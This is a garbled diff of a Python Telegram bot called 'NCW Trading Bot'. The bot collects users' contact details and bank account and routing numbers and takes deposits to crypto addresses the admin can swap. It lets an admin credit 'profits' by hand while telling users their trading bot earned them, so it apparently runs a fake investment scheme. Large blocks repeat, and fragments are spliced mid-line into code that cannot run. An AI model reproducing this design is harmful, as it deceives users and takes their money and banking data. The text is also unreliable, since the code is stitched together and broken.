+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
             WITHDRAW_ROUTING: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_routing_number),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
         },
         fallbacks=[
             CommandHandler("start", start),
-            CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+            CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
         ],
         per_message=False
     )
     
-    application.add_handler(conv_handler)
+    # Admin conversation handler
+    admin_conv_handler = ConversationHandler(
+        entry_points=[
+            CommandHandler("adminpanel", admin_panel),
+        ],
+        states={
+            ADMIN_STATE: [
+                CallbackQueryHandler(handle_admin_action, pattern='^admin_'),
+            ],
+        },
+        fallbacks=[
+            CommandHandler("adminpanel", admin_panel),
+        ],
+        per_message=False
+    )
+    
+    # Add handlers
+    application.add_handler(user_conv_handler)
+    application.add_handler(admin_conv_handler)
+    
+    # Standalone callback handlers for admin actions
+    application.add_handler(CallbackQueryHandler(handle_user_approval, pattern='^approve_user_'))
+    application.add_handler(CallbackQueryHandler(handle_deposit_confirmation, pattern='^confirm_deposit_'))
+    application.add_handler(CallbackQueryHandler(handle_withdrawal_approval, pattern='^approve_withdrawal_'))
+    
+    # Command handlers
     application.add_handler(CommandHandler("getid", get_id))
     application.add_handler(CommandHandler("approve", approve_deposit))
     application.add_handler(CommandHandler("approvewithdrawal", approve_withdrawal))
@@ -1568,4 +10647,379 @@ def main() -> None:
     application.run_polling(allowed_updates=Update.ALL_TYPES, timeout=30)
 
 if __name__ == '__main__':
-    main()
+    main():.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
